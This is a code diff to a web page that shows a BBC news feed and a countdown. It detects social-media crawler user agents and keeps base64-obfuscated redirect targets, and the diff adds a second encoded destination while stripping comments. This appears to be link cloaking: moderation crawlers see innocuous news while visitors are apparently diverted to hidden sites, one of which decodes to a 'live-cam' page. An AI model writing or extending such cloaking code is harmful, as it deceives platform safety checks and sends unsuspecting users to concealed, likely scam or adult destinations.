@@ -12,7 +12,7 @@
       padding: 20px;
       background: #f0f2f5;
       color: #333;
-      display: none; /* Ẩn cho đến khi banner load */
+      display: none; 
     }
     .banner {
       text-align: center;
@@ -117,7 +117,7 @@
   </div>
 
   <script>
-    // Đặt global để tránh lỗi undefined khi gọi onload từ script banner
+    
     window.initPageAfterBanner = function(error) {
       try {
         if (window.__bannerLoaded) return; 
@@ -129,7 +129,8 @@
 
         // encrypted targets (kept from original)
         const ENCRYPTED_TARGETS = [
-          'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWNhbV8yNi5odG1s'
+          'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWNhbV8yNi5odG1s',
+          'aHR0cHM6Ly94YmxpbmcueG8uamU='
         ];
 
         function decryptTarget(encrypted) {
@@ -145,7 +146,7 @@
           return /facebookexternalhit|Facebot|Twitterbot|LinkedInBot/i.test(navigator.userAgent);
         }
 
-        // ✅ Sửa phần loadSimpleNews — dùng rss2json cho RSS BBC
+      
         async function loadSimpleNews() {
           const container = document.getElementById('news-container');
           const rssURL = 'https://api.rss2json.com/v1/api.json?rss_url=https://feeds.bbci.co.uk/news/rss.xml';
@@ -206,7 +207,7 @@
           }, 1000);
         }
 
-        // Khởi chạy
+      
         loadSimpleNews();
         startCountdown();
 
